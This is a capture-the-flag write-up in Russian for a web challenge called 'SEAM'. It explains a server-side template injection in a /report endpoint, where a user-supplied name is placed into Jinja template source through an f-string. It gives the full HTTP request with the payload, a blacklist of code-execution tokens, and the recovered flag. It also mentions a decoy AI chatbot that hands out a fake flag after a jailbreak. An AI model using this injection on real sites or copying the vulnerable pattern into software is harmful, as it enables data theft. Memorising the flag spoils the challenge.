# SEAM writeup

## Задание

Дан веб-таск `SEAM` на `1000` очков с описанием:

```text
LabyrinthCorp has deployed an internal employee portal. You have access to register an account. Find a way to extract the flag.
```

Формат флага:

```text
THEM?!CTF{...}
```

## Recon

После регистрации и логина интересная поверхность выглядит так:

| Route | Что видно |
|---|---|
| `/` | Страница логина |
| `/register` | Регистрация |
| `/login` | Аутентификация |
| `/dashboard` | Основной портал |
| `/report` | Отправка bug report, самый интересный маршрут |
| `/dashboard/admin` | Редиректит на `/api/flag` |
| `/api/flag` | Редиректит обратно на `/dashboard/admin` |
| `/api/chat` | AI-чат |
| `/robots.txt` | Набор фейковых скрытых путей |

Плюс рядом лежат явные ловушки:

- фейковые креды в HTML comments
- бесконечный redirect loop между `/dashboard/admin` и `/api/flag`
- чат-бот, который после jailbreak-а отдает фейковый флаг
- honeypot backup/admin файлы

Значит, настоящий путь решения надо искать не там.

## Подозрительный endpoint

Самый интересный маршрут здесь - `/report`.

В обработчике есть ветка, которая срабатывает только если:

- `Content-Type` содержит `text/plain`
- `Referer` содержит строку `report`

В этой ветке сервер вручную парсит сырой body и достает:

```python
name = params.get('name', 'User')
```

А затем строит шаблон так:

```python
tpl = f"<p>Thank you, {name}! Your report has been received...</p>"
return _sandbox.from_string(tpl).render(config=ctx_config)
```

Вот это и есть уязвимость.

Пользовательский `name` вставляется прямо в **исходник шаблона** через f-string, а уже потом результат отдается Jinja на рендер.

Это textbook SSTI.

## Почему флаг можно забрать напрямую

В render context лежит:

```python
ctx_config = {'FLAG': _player_flag(request)}
```

То есть внутри шаблона уже доступно:

```jinja2
{{config.FLAG}}
```

Следовательно, нам не нужны:

- sandbox escape
- traversal по Python-объектам
- RCE

Флаг уже лежит прямо в контексте шаблона.

## Проверка blacklist

Задача пытается отрезать очевидные payload'ы через blacklist:

```python
BLACKLIST = ['__', 'os', 'subprocess', 'popen', 'system',
             'eval', 'exec', 'import', 'open', 'builtins',
             'globals', 'locals', 'getattr', 'setattr',
             '|attr', 'request', 'lipsum', 'cycler', 'joiner',
             'namespace', 'range(', 'dict(', 'class(']
```

Перед проверкой строка нормализуется, так что whitespace bypass тут не особо помогает.

Но это и не нужно, потому что:

```jinja2
{{config.FLAG}}
```

не содержит ни одного запрещенного токена.

То есть intended exploit здесь заметно проще, чем обычный Jinja escape.

## Эксплуатация

Чтобы попасть в уязвимую ветку, нужны:

- валидная сессия
- `Content-Type: text/plain`
- `Referer`, содержащий `report`

После этого отправляем:

```http
POST /report HTTP/1.1
Host: <host>
Cookie: lc_session=<your_session>
Content-Type: text/plain
Referer: http://<host>/report

name={{config.FLAG}}
```

Сервер вставляет это в исходник шаблона и затем рендерит его.

## Результат

В ответе флаг появляется прямо в HTML:

```html
<p>Thank you, THEM?!CTF{s5t1_thr0ugh_th3_s34ms}! Your report has been received and will be reviewed within 3–5 business days.</p>
```

## Почему это работает

Корень бага очень простой:

1. пользовательский ввод попадает в шаблон через f-string
2. потом эта строка парсится как Jinja template

То есть атакующий контролирует не просто данные шаблона, а сам шаблонный синтаксис.

Это и есть классическая SSTI.

Важный нюанс: `config` здесь не является глобальным Flask `app.config`.
Это просто словарь, внутри которого уже лежит флаг.

Поэтому самый короткий путь здесь не через escape или code execution, а просто:

```jinja2
{{config.FLAG}}
```

## Итоговый флаг

```text
THEM?!CTF{s5t1_thr0ugh_th3_s34ms}
```

